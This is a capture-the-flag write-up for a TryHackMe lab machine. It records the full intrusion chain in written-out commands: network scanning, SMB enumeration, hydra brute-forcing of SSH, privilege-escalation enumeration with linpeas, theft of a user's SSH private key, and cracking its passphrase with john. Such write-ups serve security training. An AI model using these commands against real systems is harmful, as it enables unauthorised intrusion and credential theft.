# Basic Pentesting

[Room Link](https://tryhackme.com/room/basicpentestingjt)

`nmap -A -vv -T4 10.10.3.56`

nmap, naturally

```
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        syn-ack Apache Tomcat 9.0.7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-03-14T01:25:44-04:00
| smb2-time: 
|   date: 2025-03-14T05:25:44
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36500/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13459/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23760/udp): CLEAN (Failed to receive data)
|   Check 4 (port 24943/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

```


![image](https://github.com/user-attachments/assets/047b8f9a-7113-4b6b-9f90-00c12546fa97)

From the website, hence ran dirbuster to see if I find any

![image](https://github.com/user-attachments/assets/1852ef02-79ce-4fed-949c-8407268e0345)


![image](https://github.com/user-attachments/assets/ae7ef6c6-a22f-40ca-9d4e-6d700a9e818e)


![image](https://github.com/user-attachments/assets/4efaa7dd-3278-4ba7-8c40-c0d505293678)


Here, we see two members J and K discussing stuffs, which maybe usefull later?

I tried search for exploits for the given service and version but couldn't find any

moving on

I tried to enumerate smb
Used `enum4linux`

Some relevant results:

`enum4linux -a 10.10.3.56`

```
[+] Attempting to map shares on 10.10.3.56

//10.10.3.56/Anonymous	Mapping: OK Listing: OK Writing: N/
```

i.e.; Anonymous login allowed

```
[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5
```

Indeed they have a weak password policy

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

And we found the two users

I also tried to login to smb using the anonymous user

```
smbclient //10.10.3.56/Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 23:01:20 2018
  ..                                  D        0  Thu Apr 19 22:43:06 2018
  staff.txt                           N      173  Thu Apr 19 22:59:55 2018

		14318640 blocks of size 1024. 11070564 blocks available
smb: \> cat staff.txt
cat: command not found
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \>


└──╼ $cat staff.txt 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Yeah, it's pretty much Jan and Kay.

Now that we got the username, we will bruteforce the password (according to the challenge)
But which password?
The website doesn't seem to have the login page
So we try ssh?

`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.3.56`

reulsts:

`[22][ssh] host: 10.10.3.56   login: jan   password: armando`

Logged in just to find that jan doesn't have any permission and can't read potential clue files

```
jan@basic2:/home/kay$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.
jan@basic2:/home/kay$
```
Snooped around and found out about [LinEnum](https://github.com/rebootuser/LinEnum) or [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

We will now use scp to transfer linpeas.sh to victim machine

```

└──╼ $scp linpeas.sh jan@10.10.3.56:/dev/shm
jan@10.10.3.56's password: 
linpeas.sh


jan@basic2:/dev/shm$ ls
linpeas.sh
jan@basic2:/dev/shm$
jan@basic2:/dev/shm$ chmod +x linpeas.sh

```

on running linpeas
```
══╣ Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
```

steal the id rsa from kay
import to our machine and `chmod 600 <filename>` (important)

convert the file to john readable format `ssh2john kay_id_rsa >forjohn.txt`

`sudo john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt `

`beeswax          (kay_id_rsa)  `

boom, gotcha

```
└──╼ $ssh -i kay_id_rsa kay@10.10.3.56
Enter passphrase for key 'kay_id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$
```

```
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ sudo -l
[sudo] password for kay: 
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
kay@basic2:~$
```

Everything is possible





